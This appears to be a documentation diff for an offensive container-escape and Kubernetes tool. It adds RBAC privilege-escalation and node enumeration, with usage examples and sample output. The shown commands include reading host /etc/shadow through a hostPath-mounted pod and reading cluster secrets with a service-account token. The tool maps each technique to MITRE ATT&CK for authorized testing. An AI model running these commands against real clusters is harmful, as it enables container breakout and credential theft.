@@ -18,7 +18,7 @@ Container escape and Kubernetes operations — enumerate and exploit breakout ve
 | action | No | check | Escape technique or K8s operation |
 | command | No | — | Command to execute, secret name, or 'podname command' for k8s-exec |
 | image | No | alpine | Container image for docker-sock/k8s-deploy/k8s-exec |
-| path | No | auto-detect | Block device path for mount-host, or K8s namespace override |
+| path | No | auto-detect | Block device path for mount-host; namespace override for K8s actions (`k8s-rbac` accepts `<ns>`, `<ns1,ns2,...>`, or `*` for every namespace) |
 
 ### Actions
 
@@ -29,9 +29,11 @@ Container escape and Kubernetes operations — enumerate and exploit breakout ve
 - **nsenter** — Enter host PID namespace via nsenter to run commands as host root
 - **mount-host** — Mount host block device to read host filesystem (requires CAP_SYS_ADMIN)
 
-**Kubernetes Operations (T1610, T1613, T1552.007):**
+**Kubernetes Operations (T1610, T1613, T1552.007, T1069.003, T1087.004):**
 - **k8s-enum** — Discover K8s API server, enumerate namespaces, pods, and services
 - **k8s-secrets** — List and read Kubernetes secrets (T1552.007). Use `-command <name>` to read a specific secret
+- **k8s-rbac** — Enumerate ClusterRoles, ClusterRoleBindings, Roles, and RoleBindings; cross-reference subjects against rules to surface privilege-escalation paths (T1069.003). Findings are scored crit/warn/info — `cluster-admin` bindings, `system:masters` membership, wildcard verbs, `escalate`/`bind` on (cluster)roles, `impersonate` on serviceaccounts, and `mint tokens for any service account` are crit. Use `-path <ns>` for a single namespace, `<ns1,ns2,...>` for a list, or `*` for every namespace
+- **k8s-nodes** — Enumerate cluster nodes via `/api/v1/nodes`. Surfaces kubelet version, OS image, kernel version (CVE/LPE hunt), pod CIDRs, taints, labels (control-plane vs worker roles), internal/external IPs, container runtime, and allocatable CPU/memory/pods (T1087.004)
 - **k8s-deploy** — Create a pod with host filesystem mount and execute commands
 - **k8s-exec** — Run a command in an existing pod's context via ephemeral pod with same service account
 
@@ -82,6 +84,18 @@ container-escape -action k8s-secrets
 # Read a specific secret
 container-escape -action k8s-secrets -command my-secret-name
 
+# RBAC privesc paths (default = current namespace + cluster-scoped objects)
+container-escape -action k8s-rbac
+
+# RBAC analysis across multiple namespaces
+container-escape -action k8s-rbac -path kube-system,prod,ci
+
+# RBAC analysis across every reachable namespace
+container-escape -action k8s-rbac -path "*"
+
+# Cluster node attack-surface enumeration
+container-escape -action k8s-nodes
+
 # Deploy a pod with host filesystem mount
 container-escape -action k8s-deploy -command "cat /hostfs/etc/shadow" -image alpine
 
@@ -89,7 +103,66 @@ container-escape -action k8s-deploy -command "cat /hostfs/etc/shadow" -image alp
 container-escape -action k8s-exec -command "nginx-pod-abc123 id"
 ```
 
-K8s operations require a service account token (auto-detected from `/var/run/secrets/kubernetes.io/serviceaccount/`). All API calls use the service account's RBAC permissions. Use `k8s-enum` first to assess available access.
+K8s operations require a service account token (auto-detected from `/var/run/secrets/kubernetes.io/serviceaccount/`). All API calls use the service account's RBAC permissions. Use `k8s-enum` first to assess available access; `k8s-rbac` then maps the privilege landscape and `k8s-nodes` identifies the underlying hosts.
+
+### Example Output (k8s-rbac)
+
+```
+=== KUBERNETES RBAC ENUMERATION ===
+
+API Server: https://10.0.0.1:6443
+Current SA Namespace: default
+
+--- Counts ---
+  ClusterRoles loaded:        78
+  Namespaced Roles loaded:    14
+  Bindings analysed:          63
+
+--- Privilege Escalation Findings (3) ---
+  [CRIT] ServiceAccount/robot@kube-system
+        via ClusterRoleBinding/admin-bind → ClusterRole/cluster-admin
+        binds subject to cluster-admin (root-equivalent)
+  [CRIT] User/build@globetech.biz
+        via ClusterRoleBinding/role-escalator → ClusterRole/role-editor
+        escalate or bind cluster-roles (grant cluster-admin to yourself)
+  [WARN] ServiceAccount/build-bot@ci
+        via ClusterRoleBinding/ci-deployer → ClusterRole/deployer
+        create/modify pods (run arbitrary containers, optionally privileged or hostPath-mounted)
+```
+
+### Example Output (k8s-nodes)
+
+```
+=== KUBERNETES NODE ENUMERATION ===
+
+API Server: https://10.0.0.1:6443
+Nodes:      3
+
+[*] node-01
+    Roles:        control-plane,master
+    Ready:        True
+    InternalIP:   10.0.0.11
+    PodCIDR:      10.244.0.0/24
+    Kubelet:      v1.29.3
+    OS:           Ubuntu 22.04.4 LTS
+    Kernel:       5.15.0-105-generic
+    Runtime:      containerd://1.7.13
+    Arch:         amd64
+    Allocatable:  cpu=4 mem=8049052Ki pods=110
+    Taints:       node-role.kubernetes.io/control-plane:NoSchedule
+
+[*] node-02
+    Roles:        worker
+    Ready:        True
+    InternalIP:   10.0.0.12
+    PodCIDR:      10.244.1.0/24
+    Kubelet:      v1.29.3
+    OS:           Ubuntu 22.04.4 LTS
+    Kernel:       5.15.0-105-generic
+    Runtime:      containerd://1.7.13
+    Arch:         amd64
+    Allocatable:  cpu=8 mem=16097600Ki pods=110
+```
 
 ## MITRE ATT&CK Mapping
 
@@ -99,3 +172,5 @@ K8s operations require a service account token (auto-detected from `/var/run/sec
 | T1610 | Deploy Container |
 | T1613 | Container and Resource Discovery |
 | T1552.007 | Unsecured Credentials: Container API |
+| T1069.003 | Permission Groups Discovery: Cloud Groups |
+| T1087.004 | Account Discovery: Cloud Account |
